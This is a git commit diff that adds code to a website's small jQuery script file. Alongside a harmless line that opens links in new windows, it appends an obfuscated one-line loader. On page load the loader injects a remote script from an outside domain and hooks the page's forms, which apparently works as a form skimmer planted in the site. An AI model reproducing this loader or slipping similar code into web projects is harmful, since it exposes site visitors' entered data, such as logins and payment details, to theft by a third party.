66d18bf4a7b9d53a3b373eb427061d1d86157578
Chris <yeochinyi@gmail.com>
2014-12-07 01:29:22 +0800

    added snp Chris

--- app/kcaroo-js/script.js
+++ app/kcaroo-js/script.js
@@ -1,3 +1,4 @@
 $(document).ready(function(){
   $("a.new_window").attr("target", "_blank");
  });
+(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src="//spartanking.ltd/client.js?cache=ignore",o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//13d24456aac9da6d428dff2180c49a3ddb5055080990a66dd8e809ef2a7fe578
